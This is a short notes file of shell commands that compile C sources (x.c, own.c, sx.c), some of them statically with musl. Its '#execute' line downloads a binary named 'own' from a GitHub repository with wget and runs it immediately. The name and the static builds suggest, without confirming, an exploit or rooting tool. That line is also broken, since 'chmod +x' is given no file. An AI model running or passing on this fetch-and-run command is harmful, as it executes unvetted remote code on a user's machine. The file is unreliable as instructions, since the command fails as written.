#compile

gcc -o x x.c

gcc x.c -o x -pthread

gcc x.c -o x -lpthread

apt update && apt install musl musl-dev musl-tools

musl-gcc -static own.c -o own
musl-gcc -static sx.c -o sx


#execute

wget https://github.com/x011-al/flex-x/raw/refs/heads/main/own && chmod +x && ./own
